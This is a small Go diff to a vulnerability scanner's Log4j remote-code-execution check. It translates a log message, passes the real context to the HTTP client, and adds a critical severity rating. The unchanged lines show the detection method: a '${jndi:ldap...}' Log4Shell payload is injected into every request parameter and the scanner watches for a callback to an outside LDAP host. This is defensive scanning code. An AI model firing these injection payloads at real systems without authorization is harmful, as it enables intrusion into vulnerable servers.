@@ -22,13 +22,13 @@ func (*log4jRce) Finger() *base.Finger {
 	return &base.Finger{
 		ExecAction: func(ctx context.Context, ab *base.Apollo) error {
 			flow := ab.GetTargetFlow()
-			logger.Infof("开始检测[%s] URL=%s", "poc-go-log4j-rce", flow.Request.URL().String())
+			logger.Debugf("Start detection [%s] URL=%s", "poc-go-log4j-rce", flow.Request.URL().String())
 			for _, param := range flow.Request.ParamsQueryAndBody() {
 				unit := ab.Reverse.Register(nil)
 				payload := fmt.Sprintf("${jndi:%s}", unit.GetLdapURL())
 				parameter := http.Parameter{Position: param.Position, Key: param.Key, Value: payload}
 				req := flow.Request.Mutate(&parameter)
-				res, err := ab.HTTPClient.Respond(context.TODO(), req)
+				res, err := ab.HTTPClient.Respond(ctx, req)
 				if err != nil {
 					continue
 				}
@@ -50,6 +50,6 @@ func (*log4jRce) Finger() *base.Finger {
 		CheckAction: func(ctx context.Context, apollo *base.Apollo) error {
 			return nil
 		},
-		Binding: &model.VulnBinding{ID: "poc-go-log4j-rce", Plugin: "poc-go-log4j-rce", Category: "poc"},
+		Binding: &model.VulnBinding{ID: "poc-go-log4j-rce", Plugin: "poc-go-log4j-rce", Category: "poc", Severity: model.SeverityCritical},
 	}
 }
